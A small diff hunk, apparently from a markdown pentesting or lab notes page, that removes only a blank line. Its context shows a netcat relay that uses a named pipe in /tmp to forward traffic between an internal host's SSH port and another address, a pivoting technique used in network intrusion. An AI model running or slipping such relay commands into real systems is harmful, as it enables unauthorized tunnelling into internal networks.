@@ -583,7 +583,6 @@ cd /tmp; mknod backpipex p
 while true; do
     nc 172.16.50.222 22 0<backpipex | nc 10.13.37.11 111 | tee backpipex   
 done;
-
 ```
 {% endtab %}
 
